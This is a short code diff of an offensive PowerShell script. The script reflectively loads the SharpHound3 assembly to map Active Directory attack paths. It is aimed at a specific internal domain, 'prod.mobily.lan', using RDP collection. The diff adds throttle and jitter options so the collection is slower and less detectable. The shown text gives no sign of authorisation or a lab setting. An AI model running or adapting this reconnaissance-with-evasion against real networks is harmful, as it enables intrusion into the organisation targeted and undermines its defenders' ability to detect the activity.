@@ -510,5 +510,5 @@ function Invoke-BloodHound{
 	$Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $BindingFlags).Invoke($Null, @())
 	$Assembly.GetType("SharpHound3.SharpHound").GetMethod("InvokeSharpHound").Invoke($Null, @(,$passed))
 }
-Invoke-BloodHound -Domain prod.mobily.lan -CollectionMethod RDP  
+Invoke-BloodHound -Domain prod.mobily.lan -CollectionMethod RDP -Throttle 6000 -Jitter 50
 #-Throttle 6000 -Jitter 50
